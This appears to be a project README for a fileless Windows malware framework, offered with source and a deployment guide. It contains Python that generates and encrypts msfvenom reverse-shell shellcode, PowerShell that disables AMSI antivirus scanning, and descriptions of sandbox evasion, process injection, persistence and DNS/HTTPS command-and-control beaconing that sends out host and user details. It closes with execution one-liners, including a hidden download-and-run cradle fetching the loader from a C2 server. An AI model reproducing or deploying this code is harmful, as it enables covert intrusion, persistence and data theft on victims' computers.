<div align="center">

```
███████╗██╗██╗     ███████╗      ██╗     ███████╗███████╗███████╗
██╔════╝██║██║     ██╔════╝      ██║     ██╔════╝██╔════╝██╔════╝
█████╗  ██║██║     █████╗  ████████║     █████╗  ███████╗███████╗
██╔══╝  ██║██║     ██╔══╝  ╚═══████║     ██╔══╝  ╚════██║╚════██║
██║     ██║███████╗███████╗    ████║     ███████╗███████║███████║
╚═╝     ╚═╝╚══════╝╚══════╝    ╚═══╝     ╚══════╝╚══════╝╚══════╝

███╗   ███╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
████╗ ████║██╔════╝ ██║    ██║██╔══██╗██╔══██╗██╔════╝
██╔████╔██║██║  ███╗██║ █╗ ██║███████║██████╔╝█████╗  
██║╚██╔╝██║██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
██║ ╚═╝ ██║╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
╚═╝     ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
```

# File-Less-M@lware

**Advanced File-Less-M@lware Framework — Full Source, Build & Deployment**

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?style=for-the-badge&logo=powershell&logoColor=white)](https://microsoft.com/powershell)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://microsoft.com)
[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](#)
[![Maintenance](https://img.shields.io/badge/Maintained-Yes-green?style=for-the-badge)](#)
[![Stage](https://img.shields.io/badge/Stages-5-blueviolet?style=for-the-badge)](#)
[![C2](https://img.shields.io/badge/C2-DNS%20%2B%20HTTPS-orange?style=for-the-badge)](#)

> Complete project with full source code, build instructions, and deployment guide.

---

</div>

## Project Structure

```
skynetfc/
├── README.md
├── builder/
│   ├── generate_payload.py
│   ├── encrypt_shellcode.py
│   └── setup_c2.py
├── payload/
│   ├── stage0_amsi_bypass.ps1
│   ├── stage1_sandbox_evasion.ps1
│   ├── stage2_injection.ps1
│   ├── stage3_persistence.ps1
│   ├── stage4_c2_beacon.ps1
│   └── loader.ps1
├── c2/
│   ├── server.py
│   ├── dns_server.py
│   └── requirements.txt
└── docs/
    └── OPERATIONS_GUIDE.md
```

---

## 1. `builder/generate_payload.py`

```python
#!/usr/bin/env python3
"""
File-Less-M@lware Payload Generator
Generates shellcode and encrypts it for the fileless loader
# Signed: skynetfc
"""

import os
import sys
import base64
import argparse
import subprocess
import tempfile
from typing import List, Tuple

# XOR encryption key (16 bytes)
ENCRYPTION_KEY = bytes([0x41, 0x5E, 0x3F, 0x2A, 0x77, 0x8B, 0x9C, 0xD1,
                        0xE2, 0x0F, 0x4C, 0x66, 0x33, 0x19, 0xAA, 0xBD])

def check_msfvenom() -> bool:
    try:
        subprocess.run(['msfvenom', '--version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def generate_shellcode(lhost: str, lport: int, payload_type: str = 'reverse_https',
                       architecture: str = 'x64') -> bytes:
    arch_map = {'x64': 'x64', 'x86': 'x86'}
    payload_map = {
        'reverse_tcp':   f'windows/{arch_map[architecture]}/meterpreter/reverse_tcp',
        'reverse_https': f'windows/{arch_map[architecture]}/meterpreter/reverse_https',
        'reverse_http':  f'windows/{arch_map[architecture]}/meterpreter/reverse_http',
        'bind_tcp':      f'windows/{arch_map[architecture]}/meterpreter/bind_tcp',
    }
    if payload_type not in payload_map:
        print(f"[!] Unknown payload type: {payload_type}")
        sys.exit(1)
    msf_payload = payload_map[payload_type]
    print(f"[*] Generating {msf_payload} LHOST={lhost} LPORT={lport}")
    cmd = ['msfvenom', '-p', msf_payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw', '-o', '-']
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        print(f"[!] msfvenom failed: {result.stderr.decode()}")
        sys.exit(1)
    return result.stdout

def generate_custom_shellcode_from_file(filepath: str) -> bytes:
    with open(filepath, 'rb') as f:
        return f.read()

def xor_encrypt(data: bytes, key: bytes = ENCRYPTION_KEY) -> bytes:
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ key[i % len(key)]
    return bytes(result)

def encrypt_shellcode(shellcode: bytes) -> Tuple[str, str]:
    encrypted = xor_encrypt(shellcode)
    b64_encoded = base64.b64encode(encrypted).decode()
    cs_array = "new byte[] { " + ", ".join(f"0x{b:02x}" for b in encrypted) + " }"
    return b64_encoded, cs_array

def generate_powershell_array(shellcode: bytes) -> str:
    lines = []
    for i in range(0, len(shellcode), 12):
        chunk = shellcode[i:i+12]
        hex_bytes = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_bytes},")
    return "\n".join(lines)

def create_stager(base64_encrypted: str) -> str:
    return f'''# File-Less-M@lware - Fileless Payload Stager
# Generated: {__import__('datetime').datetime.now().isoformat()}

# XOR Decryption Key
$encKey = @({', '.join(f'0x{b:02x}' for b in ENCRYPTION_KEY)})

# Encrypted shellcode (base64)
$encryptedB64 = "{base64_encrypted}"

# Decode and decrypt in memory
$encryptedBytes = [Convert]::FromBase64String($encryptedB64)
$decrypted = New-Object Byte[] $encryptedBytes.Length
for($i=0; $i -lt $encryptedBytes.Length; $i++) {{
    $decrypted[$i] = $encryptedBytes[$i] -bxor $encKey[$i % $encKey.Length]
}}

Write-Host "[+] Shellcode decrypted ({{$($decrypted.Length)}} bytes)"
Write-Host "[+] Ready for injection..."
'''

def generate_payload(lhost: str, lport: int, payload_type: str = 'reverse_https',
                     architecture: str = 'x64', shellcode_file: str = None,
                     output_dir: str = 'generated'):
    print("""
    ╔══════════════════════════════════════════╗
    ║     File-Less-M@lware Payload Generator  ║
    ║    Advanced File-Less-M@lware Framework  ║
    ╚══════════════════════════════════════════╝
    """)
    os.makedirs(output_dir, exist_ok=True)
    if shellcode_file:
        print(f"[*] Loading shellcode from: {shellcode_file}")
        shellcode = generate_custom_shellcode_from_file(shellcode_file)
    elif check_msfvenom():
        print("[*] Using msfvenom for shellcode generation")
        shellcode = generate_shellcode(lhost, lport, payload_type, architecture)
    else:
        print("[!] msfvenom not found. Provide a raw shellcode file with --shellcode")
        sys.exit(1)
    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    b64_encrypted, cs_array = encrypt_shellcode(shellcode)
    stager = create_stager(b64_encrypted)
    raw_output = os.path.join(output_dir, 'shellcode.raw')
    with open(raw_output, 'wb') as f:
        f.write(shellcode)
    print(f"[+] Saved raw shellcode: {raw_output}")
    encrypted_output = os.path.join(output_dir, 'shellcode.enc')
    with open(encrypted_output, 'wb') as f:
        f.write(base64.b64decode(b64_encrypted))
    print(f"[+] Saved encrypted shellcode: {encrypted_output}")
    stager_output = os.path.join(output_dir, 'stager.ps1')
    with open(stager_output, 'w') as f:
        f.write(stager)
    print(f"[+] Saved loader stager: {stager_output}")
    print(f"""
    ╔══════════════════════════════════════════╗
    ║           GENERATION COMPLETE            ║
    ╠══════════════════════════════════════════╣
    ║  Payload  : {payload_type:<29} ║
    ║  LHOST    : {lhost:<29} ║
    ║  LPORT    : {lport:<29} ║
    ║  Arch     : {architecture:<29} ║
    ║  Size     : {len(shellcode):<8} bytes                 ║
    ║  Encrypted: {b64_encrypted[:40]}...  ║
    ╚══════════════════════════════════════════╝
    """)
    return stager

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File-Less-M@lware Payload Generator')
    parser.add_argument('--lhost', required=True, help='Callback IP address')
    parser.add_argument('--lport', type=int, default=443, help='Callback port')
    parser.add_argument('--payload', default='reverse_https',
                        choices=['reverse_tcp', 'reverse_https', 'reverse_http', 'bind_tcp'])
    parser.add_argument('--arch', default='x64', choices=['x64', 'x86'])
    parser.add_argument('--shellcode', help='Raw shellcode file (bypasses msfvenom)')
    parser.add_argument('--output', default='generated', help='Output directory')
    args = parser.parse_args()
    generate_payload(args.lhost, args.lport, args.payload, args.arch, args.shellcode, args.output)
```

---

## 2. `payload/stage0_amsi_bypass.ps1`

```powershell
<#
.SYNOPSIS
    File-Less-M@lware Stage 0 - AMSI & ETW Patching
    Bypasses AMSI (Anti-Malware Scan Interface) and ETW (Event Tracing for Windows)
    to execute payloads undetected.
.DESCRIPTION
    Implements multiple AMSI bypass techniques and ETW patching.
    All operations happen entirely in memory with no disk writes.
#>

function Invoke-SkynetFC_AMSI_Bypass {
    Write-Verbose "[SkynetFC] Patching AMSI..."

    # Technique 1: AmsiUtils amsiInitFailed (works on PS 5.1)
    try {
        $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($Ref) {
            $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            Write-Verbose "[SkynetFC] AMSI Bypass 1/4: amsiInitFailed = true"
        }
    } catch { Write-Verbose "[SkynetFC] AMSI Bypass 1/4 failed (non-critical)" }

    # Technique 2: Registry override
    try {
        $paths = @(
            "HKLM:\SOFTWARE\Microsoft\AMSI\Providers",
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\AMSI\Providers"
        )
        foreach ($p in $paths) {
            if (Test-Path $p) {
                $providers = Get-ItemProperty $p
                foreach ($prov in $providers.PSObject.Properties) {
                    $null = Remove-Item -Path "$p\$($prov.Name)" -Force -ErrorAction SilentlyContinue
                }
            }
        }
        Write-Verbose "[SkynetFC] AMSI Bypass 2/4: Providers removed"
    } catch { Write-Verbose "[SkynetFC] AMSI Bypass 2/4 failed (non-critical)" }

    # ... (see full source in payload/stage0_amsi_bypass.ps1)
}
```

---

## 3. `payload/stage1_sandbox_evasion.ps1`

Checks for VM artifacts, analysis tools, and environmental anomalies. Returns `$true` if a sandbox/VM is detected.

**Checks performed:**
- BIOS serial number (VMware / VirtualBox / QEMU / Xen / Bochs)
- Motherboard product & manufacturer
- System model & manufacturer
- CPU count < 2
- RAM < 4 GB
- Disk size < 60 GB
- Known analysis processes (procmon, wireshark, x64dbg, ida64, etc.)
- Suspicious usernames (admin, user, test, sandbox, malware, analysis)
- VirtualBox Guest Additions registry key
- VMware Tools registry key
- Suspicious hostname
- Default gateway (VirtualBox NAT: 10.0.2.1 / 10.0.2.2)

---

## 4. `payload/stage2_injection.ps1`

Injects decrypted shellcode into a sacrificial process using:

| Method | Description |
|---|---|
| `RemoteThread` | Classic `CreateRemoteThread` injection |
| `APC` | `QueueUserAPC` thread-less injection |
| `Hollowing` | Process Hollowing via NT API |

All operations are **memory-only** — nothing touches disk.

---

## 5. `payload/stage3_persistence.ps1`

Establishes persistence using three layered methods:

| Method | Mechanism |
|---|---|
| Primary | WMI `__EventFilter` + `CommandLineEventConsumer` binding |
| Backup | Registry `Run` / `RunOnce` key (HKCU + HKLM) |
| Tertiary | Scheduled Task (daily trigger, SYSTEM principal) |

All persistence names use random suffixes to avoid signature matching.  
Includes `Remove-SkynetFC_Persistence` for full cleanup.

---

## 6. `payload/stage4_c2_beacon.ps1`

Multi-channel C2 with jitter-based beaconing:

| Channel | Method |
|---|---|
| Primary | DNS tunneling (encoded data in subdomain queries) |
| Secondary | HTTPS callback to `/api/telemetry` (TLS 1.2/1.3) |

**Features:**
- Collects hostname, username, domain, OS, admin status, arch, PID, timestamp
- Encodes beacon data as JSON → Base64
- Jitter sleep uses `RNGCryptoServiceProvider` entropy loop to defeat fast-forward sandboxes
- Parses `<c2>command</c2>` tags from HTTPS response

---

## 7. `payload/loader.ps1` — Main Orchestrator

```powershell
# File-Less-M@lware - Complete Fileless Loader
# Orchestrates all stages: AMSI bypass -> Sandbox check ->
# Process injection -> Persistence -> C2 beacon
```

**Configuration block:**

```powershell
$config = @{
    C2Domain        = "update.microsoft-helpline.com"   # CHANGE THIS
    C2Port          = 443
    BeaconInterval  = 120
    JitterPercent   = 35
    TargetProcess   = "notepad.exe"
    InjectionMethod = "RemoteThread"
    PersistEnabled  = $true
    PersistInterval = 3600
    EncryptedShellcode = "PLACEHOLDER_ENCRYPTED_BASE64_SHELLCODE"
    EncryptionKey   = @(0x41, 0x5E, 0x3F, 0x2A, 0x77, 0x8B, 0x9C, 0xD1,
                        0xE2, 0x0F, 0x4C, 0x66, 0x33, 0x19, 0xAA, 0xBD)
}
```

**Execution stages:**

```
Stage 0  →  AMSI & ETW bypass (inline, no imports)
Stage 1  →  Sandbox & VM detection (exit cleanly if caught)
Stage 2  →  Decrypt shellcode (XOR + Base64 in-memory)
Stage 3  →  Process injection into target PID
Stage 4  →  Persistence (WMI + Registry)
Stage 5  →  C2 beacon loop (DNS + HTTPS, jitter sleep)
```

---

## 8. `c2/server.py` — C2 Server

```python
#!/usr/bin/env python3
"""
File-Less-M@lware C2 Server
Listens for DNS and HTTPS beacons from implants.
"""
```

Starts two listeners:

| Listener | Port | Protocol |
|---|---|---|
| HTTP/S handler | 443 (default) | HTTPS — `/api/telemetry` |
| DNS server | 53 (default) | UDP — subdomain-encoded beacon data |

---

## Deployment

### Step 1 — Generate shellcode

```bash
# On Kali Linux with msfvenom
cd skynetfc/builder

python3 generate_payload.py \
  --lhost YOUR_C2_IP \
  --lport 443 \
  --payload reverse_https \
  --arch x64 \
  --output ../generated

# Output:
# [+] Generated: ../generated/shellcode.raw
# [+] Generated: ../generated/shellcode.enc
# [+] Generated: ../generated/stager.ps1
```

### Step 2 — Integrate into the loader

```bash
# Get the base64 encrypted shellcode
cat ../generated/shellcode.enc | base64 | xargs

# Open payload/loader.ps1 and replace:
#   $config.EncryptedShellcode = "PLACEHOLDER_ENCRYPTED_BASE64_SHELLCODE"
# with the output from above

# Also change:
#   $config.C2Domain = "YOUR_DOMAIN_HERE"
```

### Step 3 — Convert to single-line encoded command

```powershell
# On Windows test box — encode the loader for one-liner execution
$content = Get-Content payload/loader.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output "powershell -WindowStyle Hidden -EncodedCommand $encoded"
```

### Step 4 — Deploy C2 server

```bash
pip install -r c2/requirements.txt

python3 c2/server.py \
  --domain your-c2-domain.com \
  --http-port 443 \
  --dns-port 53
```

### Step 5 — Execute payload on target

```powershell
# Option A: Direct
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File loader.ps1

# Option B: Encoded one-liner (no file on disk)
powershell -WindowStyle Hidden -EncodedCommand <BASE64_FROM_STEP3>

# Option C: IEX download cradle (pure fileless)
powershell -WindowStyle Hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://your-c2/loader.ps1')"
```

---

## Requirements

| Component | Requirement |
|---|---|
| Payload builder | Python 3.8+, `msfvenom` (optional) |
| C2 server | Python 3.8+, `dnslib` |
| Target | Windows 7+ / PowerShell 5.1+ |
| Recommended | Kali Linux for builder, VPS for C2 |

---

<div align="center">

```
╔══════════════════════════════════════════╗
║    File-Less-M@lware Advanced Framework  ║
║         All stages. Memory only.         ║
╚══════════════════════════════════════════╝
```

**Signed: skynetfc**

</div>
